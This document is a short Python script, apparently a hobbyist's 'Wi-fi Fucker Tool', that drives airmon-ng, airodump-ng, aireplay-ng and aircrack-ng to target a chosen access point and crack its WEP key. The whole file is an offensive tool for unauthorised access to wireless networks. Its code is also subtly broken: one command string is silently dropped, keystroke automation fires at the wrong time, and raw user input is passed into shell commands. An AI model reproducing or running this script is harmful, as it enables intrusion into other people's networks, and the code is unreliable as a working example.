import os
import time
import pyautogui
print("""

███████████████████████████████
█                             █
█═╬═════════════════════════╬═█
█ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
█ ║░░░░Wi-fi Fucker Tool░░░░║ █
█ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
█ ║░░░░░coded by arda6░░░░░░║ █
█ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
█ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
█ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
█ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
█═╬═════════════════════════╬═█
█                             █
███████████████████████████████


""")
os.system("sudo airmon-ng start")
print("░░░░░░░░░░░░░░░░░░ ═")
mon = input("░░Wifi Card Name░░ ═\n░░░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airmon-ng start " +mon+"")
os.system("sudo airodump-ng " +mon+"mon")
time.sleep(6)
pyautogui.press("ctrl+c")
print("░░░░░░░░░░░░░░░░ ═")
wifi = input("░░Select BSSID░░ ═\n░░░░░░░░░░░░░░░░ ═ ")
print("")
print("░░░░░░░░░░░░░░░░░░ ═")
channel = input("░░Select Channel░░ ═\n░░░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airodump-ng -c "+channel+ " --bssid " +wifi+ " -w " +channel+ " " +mon+"mon" and "sudo aireplay-ng -1 0 -a " +wifi+ " " +mon+"mon")
pyautogui.press("ctrl+c")
os.system("sudo aircrack-ng -K -b " +wifi+ " " +channel+".cap")
